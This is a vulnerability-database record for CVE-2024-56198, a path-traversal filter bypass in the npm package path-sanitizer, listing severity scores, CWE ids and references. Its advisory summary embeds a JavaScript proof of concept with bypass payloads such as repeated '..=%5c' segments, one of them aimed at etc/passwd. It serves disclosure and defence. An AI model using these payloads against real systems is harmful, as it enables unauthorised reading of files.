vulnerability_id: VCID-byfx-7cxk-63e8
aliases:
  - CVE-2024-56198
  - GHSA-94p5-r7cc-3rpr
summary: "path-sanitizer allows bypassing the existing filters to achieve path-traversal vulnerability\n\
  ### Summary\nThis is a POC for a path-sanitizer [npm package](https://www.npmjs.com/package/path-sanitizer).\
  \ The filters can be bypassed and can result in path traversal.\n\nPayload: `..=%5c` can be\
  \ used to bypass this on CLI (along with other candidates). Something similar would likely\
  \ work on web apps as well. \n\n### PoC\nHere's the code to test for the filter bypass:\n\n\
  ```js\nconst sanitize = require(\"path-sanitizer\")\nconst path = require(\"path\")\nconst\
  \ fs = require(\"fs\")\n\n// Real scenario:\nfunction routeHandler(myPath) {\n  // Lets just\
  \ assume that the path was extracted from the request\n  // We want to read a file in the\
  \ C:\\Users\\user\\Desktop\\myApp\\ directory\n  // But the user should be able to access\
  \ C:\\Users\\user\\Desktop\\\n  // So we need to sanitize the path\n\n  const APP_DIR = \"\
  /var/hacker\"\n  const sanitized = path.join(APP_DIR, sanitize(myPath))\n\n  // Now we would\
  \ usally read the file\n  // But in this case we just gonna print the path\n  // console.log(sanitized)\n\
  \  return sanitized\n}\n\nfunction readFile(filePath) {\n  const absolutePath = path.resolve(filePath)\
  \ // Resolve to absolute path\n\n  fs.readFile(absolutePath, \"utf8\", (err, data) => {\n\
  \    if (err) {\n      console.error(`Error reading the file: ${err.message}`)\n      return\n\
  \    }\n    console.log(`Contents of the file ${filePath} :\\n${data}`)\n  })\n}\n\ninput_user_bypass\
  \ = \"..=%5c..=%5c..=%5c..=%5c..=%5c..=%5c..=%5ctmp/hacked.txt\"\n// input_user_bypass = \"\
  ..=%5c..=%5c..=%5c..=%5c..=%5c..=%5c..=%5cetc/passwd\"\ninput_user_payload = \"../../../../../../../../tmp/hacked.txt\"\
  \n\nreadFile(routeHandler(input_user_bypass))\nreadFile(routeHandler(input_user_payload))\n\
  ```\n\nHere is a video POC: (this is a Loom POC, only users with the UUID of the video can\
  \ see it) \n\nhttps://www.loom.com/share/b766ece5193842848ce7562fcd559256?sid=fd826eb6-0eee-4601-bf0e-9cfee5c56e9d\n\
  \n### Impact\nAny CLI tool or library using this package can be/will be vulnerable to Path\
  \ traversal."
severities:
  - score: '0.00045'
    scoring_system: epss
    scoring_elements: '0.17624'
    published_at: '2025-01-16 00:00:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00096'
    scoring_system: epss
    scoring_elements: '0.24232'
    published_at: '2025-04-14 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00096'
    scoring_system: epss
    scoring_elements: '0.24262'
    published_at: '2025-04-13 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00096'
    scoring_system: epss
    scoring_elements: '0.24279'
    published_at: '2025-04-12 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00096'
    scoring_system: epss
    scoring_elements: '0.2432'
    published_at: '2025-04-11 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00096'
    scoring_system: epss
    scoring_elements: '0.24328'
    published_at: '2025-04-10 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00096'
    scoring_system: epss
    scoring_elements: '0.24295'
    published_at: '2025-04-09 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00096'
    scoring_system: epss
    scoring_elements: '0.24267'
    published_at: '2025-04-08 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00096'
    scoring_system: epss
    scoring_elements: '0.24248'
    published_at: '2025-04-07 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00096'
    scoring_system: epss
    scoring_elements: '0.2428'
    published_at: '2025-04-06 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00096'
    scoring_system: epss
    scoring_elements: '0.24329'
    published_at: '2025-04-05 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00096'
    scoring_system: epss
    scoring_elements: '0.24323'
    published_at: '2025-04-04 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00096'
    scoring_system: epss
    scoring_elements: '0.24317'
    published_at: '2025-04-03 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00096'
    scoring_system: epss
    scoring_elements: '0.24199'
    published_at: '2025-03-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00096'
    scoring_system: epss
    scoring_elements: '0.24141'
    published_at: '2025-03-30 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00096'
    scoring_system: epss
    scoring_elements: '0.2429'
    published_at: '2025-04-02 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00098'
    scoring_system: epss
    scoring_elements: '0.28673'
    published_at: '2025-04-18 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00098'
    scoring_system: epss
    scoring_elements: '0.28507'
    published_at: '2025-04-15 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00098'
    scoring_system: epss
    scoring_elements: '0.28567'
    published_at: '2025-04-16 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00098'
    scoring_system: epss
    scoring_elements: '0.2863'
    published_at: '2025-04-17 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00098'
    scoring_system: epss
    scoring_elements: '0.28667'
    published_at: '2025-04-19 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00098'
    scoring_system: epss
    scoring_elements: '0.28608'
    published_at: '2025-04-20 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00098'
    scoring_system: epss
    scoring_elements: '0.28591'
    published_at: '2025-04-21 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00098'
    scoring_system: epss
    scoring_elements: '0.28552'
    published_at: '2025-04-22 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00098'
    scoring_system: epss
    scoring_elements: '0.28554'
    published_at: '2025-04-23 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00133'
    scoring_system: epss
    scoring_elements: '0.34323'
    published_at: '2025-04-26 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00133'
    scoring_system: epss
    scoring_elements: '0.3433'
    published_at: '2025-04-25 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00133'
    scoring_system: epss
    scoring_elements: '0.34311'
    published_at: '2025-04-24 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00133'
    scoring_system: epss
    scoring_elements: '0.34272'
    published_at: '2025-04-28 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00133'
    scoring_system: epss
    scoring_elements: '0.34295'
    published_at: '2025-04-27 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: '0.00335'
    scoring_system: epss
    scoring_elements: '0.39508'
    published_at: '2025-03-29 12:55:00+00:00'
    url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
  - score: CRITICAL
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/advisories/GHSA-94p5-r7cc-3rpr
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/cabraviva/path-sanitizer
  - score: '9.3'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
    published_at: None
    url: https://github.com/cabraviva/path-sanitizer/commit/b6d2319eac910dffdfacc8460f5b5cc5a1518ead
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/cabraviva/path-sanitizer/commit/b6d2319eac910dffdfacc8460f5b5cc5a1518ead
  - score: Track*
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:P/A:Y/T:T/P:M/B:A/M:M/D:R/2024-12-31T15:50:41Z/
    published_at: None
    url: https://github.com/cabraviva/path-sanitizer/commit/b6d2319eac910dffdfacc8460f5b5cc5a1518ead
  - score: CRITICAL
    scoring_system: cvssv3.1_qr
    scoring_elements:
    published_at: None
    url: https://github.com/cabraviva/path-sanitizer/security/advisories/GHSA-94p5-r7cc-3rpr
  - score: '9.3'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
    published_at: None
    url: https://github.com/cabraviva/path-sanitizer/security/advisories/GHSA-94p5-r7cc-3rpr
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://github.com/cabraviva/path-sanitizer/security/advisories/GHSA-94p5-r7cc-3rpr
  - score: Track*
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:P/A:Y/T:T/P:M/B:A/M:M/D:R/2024-12-31T15:50:41Z/
    published_at: None
    url: https://github.com/cabraviva/path-sanitizer/security/advisories/GHSA-94p5-r7cc-3rpr
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://nvd.nist.gov/vuln/detail/CVE-2024-56198
  - score: '9.3'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
    published_at: None
    url: https://www.loom.com/share/b766ece5193842848ce7562fcd559256?sid=fd826eb6-0eee-4601-bf0e-9cfee5c56e9d
  - score: CRITICAL
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url: https://www.loom.com/share/b766ece5193842848ce7562fcd559256?sid=fd826eb6-0eee-4601-bf0e-9cfee5c56e9d
  - score: Track*
    scoring_system: ssvc
    scoring_elements: SSVCv2/E:P/A:Y/T:T/P:M/B:A/M:M/D:R/2024-12-31T15:50:41Z/
    published_at: None
    url: https://www.loom.com/share/b766ece5193842848ce7562fcd559256?sid=fd826eb6-0eee-4601-bf0e-9cfee5c56e9d
weaknesses:
  - CWE-22
  - CWE-937
  - CWE-1035
references:
  - url: https://api.first.org/data/v1/epss?cve=CVE-2024-56198
    reference_type:
    reference_id:
  - url: https://github.com/cabraviva/path-sanitizer
    reference_type:
    reference_id:
  - url: https://github.com/cabraviva/path-sanitizer/commit/b6d2319eac910dffdfacc8460f5b5cc5a1518ead
    reference_type:
    reference_id:
  - url: https://github.com/cabraviva/path-sanitizer/security/advisories/GHSA-94p5-r7cc-3rpr
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-56198
    reference_type:
    reference_id:
  - url: https://www.loom.com/share/b766ece5193842848ce7562fcd559256?sid=fd826eb6-0eee-4601-bf0e-9cfee5c56e9d
    reference_type:
    reference_id:
  - url: https://github.com/advisories/GHSA-94p5-r7cc-3rpr
    reference_type:
    reference_id: GHSA-94p5-r7cc-3rpr
